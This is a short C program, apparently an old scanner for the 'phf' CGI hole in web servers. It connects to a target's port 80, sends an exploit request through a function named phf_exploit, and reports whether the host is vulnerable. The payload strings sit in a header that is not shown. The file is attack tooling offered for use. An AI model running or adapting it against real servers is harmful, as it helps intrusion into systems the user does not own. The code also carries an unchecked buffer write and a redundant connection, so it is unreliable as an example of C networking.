#include "net.h"






void phf_exploit(int sockfd, char buf[100], char *sbuf) {

	char str[100];

	memset((char *)sbuf, 0, 5000);
	sprintf(str, "%s\n\r", buf);
	if (sock_write(sockfd, str, sizeof(str)) < 0) {
		perror("sock_write");
		exit(1);
	}
	if (sock_read(sockfd, sbuf, 5000) < 0) {
		perror("sock_read");
		exit(1);
	}
}



	

int web_scan(char *host)
{

	int sockfd;
	char *sbuf;
	int index;

	 
	if ((sbuf = malloc(5000)) == NULL) {
		printf("memory allocation failure.\n");
		exit(1);
	}

	printf("got mem.\n");
	if (set_connect(host, 80, &sockfd) < 0) {
		fprintf(stderr,"%s: HTTPD not found.\n", host);
	}
	else { 
		fprintf(stderr, "%s: HTTPD detected.\n\n", host);
	}


	set_connect(host, 80, &sockfd);
	phf_exploit(sockfd, PHF_BUG, sbuf);
	printf("got reply");
	fprintf(stderr, "-%s-\n", sbuf); 
	if (strstr(sbuf, PHF_NEEDLE) == NULL) {
			fprintf(stderr, "%s: HTTPD phf not allowed.\n", host); 
		} else { 
			fprintf(stderr, "%s: HTTPD phf allowed.\n", host); 
		}
	
		fprintf(stderr, "\n");

}
	

main(int argc, char **argv) {


	printf("Scanning %s...\n", argv[1]);
	web_scan(argv[1]);
	printf("done.\n");
}	
